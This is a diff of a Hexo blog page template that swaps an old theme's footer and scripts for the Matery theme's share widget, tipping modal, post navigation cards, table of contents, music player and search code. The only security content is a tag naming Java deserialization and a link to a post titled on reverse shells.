-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
 
-  </div>
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                    <span class="chip bg-color">JAVA反序列化</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    1999-2022
-    MirRoR4s
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">项目</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/MirRoR4s">MyGithub</a></li><!--
-     --><!--
-       --><li><a href="/search/">Search</a></li><!--
-     --><!--
-       --><li><a href="/tags/">标签</a></li><!--
-     --><!--
-       --><li><a href="/categories/">分类</a></li><!--
-     -->
-      </ul>
-    </nav>
-  </div>
-</footer>
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
 
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-    <!-- styles -->
+</div>
 
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
- 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功！");
-      e.clearSelection();
-    })
-  })
-  </script>
-
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Google Analytics -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Umami Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
+<script>
+    $(function () {
+        $('.tabs').tabs();
     });
 </script>
-<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/07/13/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E7%A4%BE%E5%8C%BA%E6%80%BB%E7%BB%93/index.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="常见安全社区总结">
+                        
+                        <span class="card-title">常见安全社区总结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-13
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            MirRoR4s
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/07/12/%E5%8F%8D%E5%BC%B9Shell/index.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="反弹Shell">
+                        
+                        <span class="card-title">反弹Shell</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+
+反弹Shell总结
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-12
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            MirRoR4s
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2023</span>
+            
+            <span id="year">2023</span>
+            <a href="/about" target="_blank">MirRoR4s</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/MirRoR4s" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:790356373@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=790356373" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 790356373" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
 </body>
+
 </html>
